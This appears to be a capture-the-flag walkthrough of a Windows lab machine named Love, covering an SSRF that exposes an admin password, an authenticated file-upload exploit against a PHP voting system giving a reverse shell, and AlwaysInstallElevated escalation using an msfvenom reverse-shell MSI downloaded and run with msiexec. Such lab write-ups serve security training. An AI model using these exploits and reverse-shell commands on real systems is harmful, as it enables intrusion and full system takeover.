---
created: 2026-08-25
updated: 2026-09-20
tags:
  - walkthrough
---
## Foothold

### Initial enumeration

- Nmap TCP port scan:

```bash
sudo nmap -Pn -sC -sV 10.129.48.103 
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-25 14:16 EDT
Nmap scan report for 10.129.48.103
Host is up (0.062s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
|_ssl-date: 2026-08-25T18:40:17+00:00; +21m33s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-08-25T18:40:10
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-25T11:40:12-07:00
|_clock-skew: mean: 2h06m34s, deviation: 3h30m02s, median: 21m32s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.06 seconds
```

- From the results, we see the target hosts the `love.htb` domain.
- From a TLS certificate on port `443`, we find another hostname: `staging.love.htb`. 
- Let's add all domain names to `/etc/hosts`:

```bash
10.129.48.103 love.htb
10.129.48.103 www.love.htb
10.129.48.103 staging.love.htb
10.129.48.103 www.example.com
```

### Staging

- At `staging.love.htb`, we see a file scanning functionality, which accepts a URL.

```
http://staging.love.htb/beta.php
```

- Testing `http://127.0.0.1` gives you HTML of the `http://love.htb/index.php` page. This is SSRF.
- Earlier we have seen `403 Forbidden` on port `5000`. But SSRF helps us to bypass access controls (which, it seems, are based on simple network boundary checks) and access `http://127.0.0.1:5000`.

```bash
http://127.0.0.1:5000
```

- It shows a password dashboard and we find `admin`'s password: `@LoveIsInTheAir!!!!`.

### Voting system

- Navgiate back to `love.htb` and find `Voting system` software.
- Use search engine to find an exploit for a known vulnerability: [`File Upload RCE (Authenticated Remote Code Execution — Exploit DB`](https://www.exploit-db.com/exploits/49445).
- This exploit requires credentials, we can use those found earlier.
- Save the script to your attack machine and change variables accordingly:

```python
import requests

# --- Edit your settings here ----
IP = "www.love.htb" # Website's URL
USERNAME = "admin" # Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.15.70" # Reverse shell IP
REV_PORT = "1337" # Reverse port 
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
```

- Start a Netcat listener:

```bash
nc -lvnp 1337
```
```bash
Listening on 0.0.0.0 1337
```

- Then execute:

```
python3 voting_system_exploit.py
```

```bash
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully
```

- Receive a connection:

```bash
Connection received on 10.129.48.103 58422
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images> whoami
 whoami
love\phoebe
```

```powershell
type C:\Users\Phoebe\Desktop\user.txt
```

```powershell
24b49c2fd245b8ff2f4a451b96089051
```

## `AlwaysInstallElevated`

- Check `AlwaysInstallElevated` registry key:

```powershell
C:\xampp\htdocs\omrs\images>reg query "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer"
reg query "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer"

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

- Get the OS architecture to generate a proper payload:

```powershell
C:\xampp\htdocs\omrs\images>wmic os get osarchitecture
```

```powershell
OSArchitecture  
64-bit
```

- On your attacker machine, generate a reverse shell payload using `msfvenom`:

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.70 LPORT=4444 -f msi -o reverse.msi
```

```powershell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```

- Start a web server:

```powershell
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Download to the target using `Invoke-WebRequest` (from PowerShell):

```powershell
Invoke-WebRequest 'http://10.10.15.70:8000/reverse.msi' -OutFile 'C:\Users\Phoebe\Desktop\reverse.msi'
```

- Then start a different listenerd for the privileged reverse shell:

```powershell
nc -lvnp 4444
Listening on 0.0.0.0 4444
```

- Trigger the downloaded `.msi`:

```powershell
msiexec /quiet /i 'C:\Users\Phoebe\Desktop\reverse.msi'
```

- This gives you a `SYSTEM` shell:

```powershell
Connection received on 10.129.48.103 58431
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami 
whoami 
nt authority\system

C:\WINDOWS\system32>
```

- Get the root flag:

```powershell
C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\root.txt
```

```powershell
5bac3ebac616bf5c884fc5ba0ba317d0
```

